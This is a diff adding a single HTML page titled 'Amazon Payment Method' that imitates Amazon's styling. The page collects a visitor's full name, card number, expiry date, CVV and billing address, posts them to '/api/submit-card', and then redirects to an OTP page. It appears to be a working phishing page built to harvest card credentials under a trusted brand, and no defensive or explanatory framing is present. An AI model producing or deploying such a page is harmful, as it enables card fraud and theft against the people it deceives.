@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Amazon Payment Method</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background:#fff;
+    margin:0;
+    padding:0;
+  }
+  .container {
+    max-width: 450px;
+    margin: 60px auto;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+  }
+  h1 {
+    margin-bottom: 15px;
+    font-weight: normal;
+  }
+  label {
+    display:block;
+    margin-top: 12px;
+    font-weight: bold;
+  }
+  input[type="text"],
+  input[type="tel"],
+  input[type="month"] {
+    width: 100%;
+    padding: 10px;
+    margin-top: 6px;
+    box-sizing: border-box;
+  }
+  button {
+    margin-top: 25px;
+    width: 100%;
+    background-color: #febd69;
+    border: none;
+    padding: 12px;
+    font-size: 16px;
+    cursor: pointer;
+    border-radius: 3px;
+  }
+  button:hover {
+    background-color: #f3a847;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Enter your payment method</h1>
+  <form id="cardForm">
+    <label for="fullname">Full Name</label>
+    <input type="text" id="fullname" required autocomplete="off" />
+
+    <label for="cardnumber">Card Number</label>
+    <input type="tel" id="cardnumber" required pattern="[0-9\s]{13,19}" autocomplete="off" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" />
+
+    <label for="expiredate">Expiration Date</label>
+    <input type="month" id="expiredate" required />
+
+    <label for="cvv">CVV</label>
+    <input type="tel" id="cvv" required pattern="[0-9]{3,4}" maxlength="4" autocomplete="off" />
+
+    <label for="address">Billing Address</label>
+    <input type="text" id="address" required autocomplete="off" />
+
+    <button type="submit">Continue</button>
+  </form>
+</div>
+
+<script>
+  document.getElementById('cardForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const fullname = document.getElementById('fullname').value.trim();
+    const cardnumber = document.getElementById('cardnumber').value.trim();
+    const expiredate = document.getElementById('expiredate').value;
+    const cvv = document.getElementById('cvv').value.trim();
+    const address = document.getElementById('address').value.trim();
+
+    await fetch('/api/submit-card', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({fullname, cardnumber, expiredate, cvv, address})
+    });
+
+    // Redirect to OTP page
+    window.location.href = '/otp.html';
+  });
+</script>
+
+</body>
+</html>
